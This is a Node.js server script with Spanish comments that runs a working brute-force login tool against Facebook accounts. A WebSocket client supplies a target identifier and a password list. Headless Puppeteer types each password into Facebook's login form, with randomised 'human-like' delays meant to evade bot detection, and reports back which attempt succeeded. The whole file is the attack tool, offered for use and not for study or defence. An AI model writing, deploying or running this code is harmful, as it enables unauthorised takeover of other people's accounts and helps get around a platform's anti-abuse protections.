const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const puppeteer = require('puppeteer');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// Función para simular retraso humano
const humanLikeDelay = async () => {
  await new Promise(resolve => setTimeout(resolve, Math.random() * 2000 + 1000));
};

// Función de inicio de sesión
const loginToFacebook = async (page, identifier, password) => {
  try {
    await page.goto('https://www.facebook.com', { waitUntil: 'networkidle2' });
    await humanLikeDelay();

    // Limpiar campos existentes
    await page.evaluate(() => {
      document.querySelector('#email').value = '';
      document.querySelector('#pass').value = '';
    });

    await page.type('#email', identifier);
    await humanLikeDelay();
    
    await page.type('#pass', password);
    await humanLikeDelay();
    
    await page.click('button[name="login"]');
    await humanLikeDelay();

    try {
      await page.waitForSelector('div[aria-label="Cuenta"]', { timeout: 5000 });
      return { success: true, password };
    } catch (error) {
      return { success: false, password };
    }
  } catch (error) {
    return { success: false, password, error: error.message };
  }
};

// Configurar WebSocket
wss.on('connection', (ws) => {
  console.log('Cliente conectado');

  ws.on('message', async (message) => {
    try {
      const data = JSON.parse(message);
      if (data.type === 'startLogin') {
        const { identifier, passwords } = data;
        
        const browser = await puppeteer.launch({ 
          headless: true, // Modo headless para Render
          args: ['--no-sandbox', '--disable-setuid-sandbox']
        });
        
        const page = await browser.newPage();
        await page.setViewport({ width: 1280, height: 800 });

        for (const password of passwords) {
          if (ws.readyState !== WebSocket.OPEN) break;
          
          const result = await loginToFacebook(page, identifier, password);
          if (ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify(result));
          }
          
          if (result.success) break;
          
          // Volver a la página de login
          await page.goto('https://www.facebook.com/login', { waitUntil: 'networkidle2' });
          await humanLikeDelay();
        }

        await browser.close();
        if (ws.readyState === WebSocket.OPEN) {
          ws.send(JSON.stringify({ type: 'finished' }));
        }
      }
    } catch (error) {
      console.error('Error:', error);
      if (ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ 
          type: 'error',
          message: `Error del servidor: ${error.message}`
        }));
      }
    }
  });

  ws.on('close', () => {
    console.log('Cliente desconectado');
  });
});

// Servir archivos estáticos
app.use(express.static('public'));

// Ruta principal
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/index.html');
});

// Iniciar servidor
const PORT = process.env.PORT || 3000; // Usar el puerto de Render o 3000 localmente
server.listen(PORT, () => {
  console.log(`Servidor en ejecución en http://localhost:${PORT}`);
});
